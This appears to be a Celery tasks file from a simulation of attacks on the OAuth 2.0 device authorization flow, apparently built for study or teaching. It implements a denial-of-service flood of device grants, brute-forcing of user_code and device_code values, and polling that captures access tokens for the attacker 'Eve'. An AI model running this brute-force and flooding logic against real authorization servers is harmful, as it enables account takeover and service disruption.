from django.db.utils import OperationalError
from django.utils.timezone import utc
from django.urls.base import reverse
from celery import shared_task
import celery
from .models import ClientID, utility_object
from device.models import DeviceGrant
from authorization_server.models import ClientID as ASClientID
from configuration.models import config_object
import logging
from urllib.parse import urlencode
import requests
import time
import time
from datetime import datetime

logger = logging.getLogger(__name__)
HEADERS = {'Content-type': 'application/x-www-form-urlencoded'}


@shared_task
def initiate_N_device_flows(device_url_for_grant, N, attacker_device_name):
    """Initites N concurrent device flows on simulated devices. 
    
    Used in Denial of Service Scenario
    """
    for i in range(N):
        data = {'attacker_device_name': attacker_device_name}
        requests.post(device_url_for_grant, headers=HEADERS, data=data)


@shared_task
def poll_for_grant_successful(client_id, grant_successful_url):
    """Poll for success of attack in CSRF with QR-Code and Remote Phishing scenario.

    Args:
        grant_successful_url (str): link to grant_successful endpoint of device
    """
      
    data = urlencode({'client_id': client_id})
    start = time.time()
    timeout = config_object().timeout
    while (time.time() - start < timeout):
        time.sleep(0.5)
        request = requests.post(grant_successful_url,
                                headers=HEADERS, data=data)
        request_data = request.json()
        if request_data['state'] == 'success':
            try:
                device_grant = DeviceGrant.objects.get(
                    client_id=int(client_id))
                logger.warning(
                    "Eve is now in possession of a valid access_token to Bob's account.\n \
                    client_id: " + str(client_id) + ", access_token: " + str(device_grant.access_token))
                return
            except DeviceGrant.DoesNotExist:
                logger.warning("Error: Device grant with client_id " + str(client_id) 
                               + " does not exist. Attack unsuccessful.")
                return
        elif request_data['state'] == 'error':
            logger.warning(
                "Attack unsuccessful. Device responds with error.")
            return
    logger.warning("Attack unsuccessful. Device does not indicate success.")


@shared_task
def brute_force_uc(server_base_url):
    """Executes brute force attack on user_code.
    
    Repeatedly loops through all possible user_codes given the entropy until success or timeout.

    Args:
        server_base_url (str): base address of AS
    """
    logger.warning("User Code Leak brute force attack on user_code started.")
    config = config_object()
    entropy = config.user_code_entropy
    start = time.time()
    current = time.time()
    # range of user_code is [2**(entropy - 1); 2**entropy - 1]
    counter = 2**(entropy - 1)
    success = False
    while (current - start < config.timeout and not success):
        # try to authenticate using current counter value as user_code
        login_data = dict(user_code=counter, username="Eve", password="evil")
        login_request = requests.post(
            server_base_url + reverse('authorization_server:authenticate'),
            headers=HEADERS, data=login_data)
        if login_request.ok:
            success = True
        else:
            # try next value as user_code
            counter += 1
            if counter > 2**entropy - 1:
                # restart from lowest possible user_code, in case the user code
                # wasn't initiated in the first round yet
                counter = 2**(entropy - 1)
        current = time.time()

    if success:
        logger.warning("User Code Leak brute force attack successful. \
            Valid user_code found, Eve is now connected to device.\n user_code: " + str(counter))
    elif current - start >= config.timeout:
        logger.warning(
            "User Code Leak brute force attack not successful. Timeout after " + str(config.timeout) + " seconds.")
    else:
        logger.warning("User Code Leak brute force attack not successful.")


@shared_task
def brute_force_dc(server_base_url):
    """Checks available client_id's and starts brute force attack once a new client_id becomes available.

    Args:
        server_base_url (str): base address of AS
    """
    # periodically check for new client_id's in AS databank
    start = time.time()
    timeout = config_object().timeout
    while time.time() - start < timeout:
        # retrive sets of old and new client_id's
        new_client_ids = set()
        try:
            new_client_ids = set(
                clientID.client_id for clientID in ASClientID.objects.all())
        except:
            pass
        old_client_ids = set()
        try:
            old_client_ids = set(
                clientID.client_id for clientID in ClientID.objects.all())
        except:
            pass

        for client_id in new_client_ids.difference(old_client_ids):
            # save new client_id in attacker db
            client = ClientID(client_id=client_id)
            while True:
                try:
                    client.save(); break
                except OperationalError:
                    pass
            # start brute force attack for new client_id's
            brute_force_dc_attack.delay(client_id, server_base_url)

        # wait some time
        time.sleep(1)


@shared_task
def brute_force_dc_attack(client_id, server_base_url):
    """Executes brute force attack for given client_id.
    
    Initite polling for all possible device_code values.
    
    Args:
        server_base_url (str): base address of AS
    """
    logger.warning(
        "Brute force attack on device_code started.\n client_id: " 
        + str(client_id))

    # Use utility db object to access start time in tasks
    utility = utility_object()
    utility.start_time = datetime.utcnow().replace(tzinfo=utc)
    while True:
        try:
            utility.save(); break
        except OperationalError:
            pass
    # poll in range of device_code, i.e. [2**(entropy - 1); 2**entropy - 1]
    entropy = config_object().device_code_entropy
    for i in range(2**(entropy - 1), 2**(entropy)):
        celery.current_app.send_task(
            'attacker.tasks.polling', args=[i, client_id, server_base_url])

    celery.current_app.send_task(
        'attacker.tasks.polling_unsuccessful', args=[client_id])


@shared_task
def polling_unsuccessful(client_id):
    """Checks if device code brute force attack was successful after timeout
    """
    start_time = utility_object().start_time
    timeout = config_object().timeout
    while (datetime.utcnow().replace(tzinfo=utc) - start_time).total_seconds() \
            < timeout + 1:
        # wait some time
        time.sleep(1)
    if not utility_object().terminated:
        logger.warning(
            "Timeout. Device Code Leak brute force attack not successful. \
                \n client_id: " + str(client_id))


@shared_task
def polling(device_code, client_id, server_base_url):
    """Polling for access_token during Device Code Leak

    Args:
        server_base_url (str): base address of AS
    """
    stop = False
    start_time = utility_object().start_time
    timeout = config_object().timeout
    while (datetime.utcnow().replace(tzinfo=utc) - start_time).total_seconds() < timeout \
            and not stop and not utility_object().terminated:
        # polling_id is an additional POST parameter used in this simulation to
        # identify the attacker for rate limiting during brute force
        data = {'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
                'device_code': device_code,
                'client_id': client_id,
                'polling_id': 'attacker_poll_device'}

        try:
            # request to token endpoint of AS
            request = requests.post(
                server_base_url + reverse('authorization_server:token-endpoint'),
                headers=HEADERS, data=urlencode(data))
            if request.ok:
                # polling successful
                data = request.json()
                if config_object().dcl_choice == 'bf':
                    logger.warning(
                        "Device Code Leak brute force attack successful. \
                        Eve is now in possession of a valid acces_token\n device_code: "
                        + str(device_code) + ", access_token: " + str(data['access_token']) 
                        + ", expires_in: " + str(data['expires_in']))
                else:
                    logger.warning(
                        "Device Code Leak polling successful. \
                        Eve is now in possession of a valid access_token.\n access_token: " 
                        + str(data['access_token']) + ", expires_in: " + str(data['expires_in']))

                utility = utility_object()
                utility.terminated = True
                while True:
                    try:
                        utility.save(); break
                    except OperationalError:
                        pass
                stop = True

            elif request.status_code == 429:
                # due to rate limiting of AS
                error = request.json()['error']

            elif request.status_code == 400:
                error = request.json()['error']

                if error == 'invalid_client':
                    # Invalid device_code. Stop polling for this device_code.
                    stop = True

                elif not error == 'authorization_pending' and not error == 'slow_down' \
                        and not config_object().dcl_choice == "bf":
                    logger.warning(
                        "Device Code Leak polling unsuccessful. Eve did not obtain a valid access_token. \
                        Error:" + error)
                    stop = True

            else:
                logger.error(
                    "Error. Status code " + request.status_code + " during access_token polling.")
                stop = True
        except Exception as e:
            logger.warning("Error during Device Code Leak polling: " + e)
            break
